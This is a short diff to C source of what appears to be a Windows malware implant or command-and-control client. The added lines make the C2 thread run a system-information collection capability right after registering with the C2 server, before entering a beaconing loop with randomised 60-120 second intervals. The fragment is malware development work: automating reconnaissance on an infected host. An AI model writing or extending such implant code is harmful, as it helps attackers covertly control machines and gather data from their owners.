@@ -296,6 +296,10 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
     // Register with C2 server
     register_with_c2(client_id);
     
+    // Execute sysinfo capability immediately after C2 init
+    printf("[*] Executing initial sysinfo collection...\n");
+    execute_capability(client_id, CMD_INFO_COLLECT);
+    
     // Main C2 loop
     while (1) {
         // Get random interval between 60 and 120 seconds
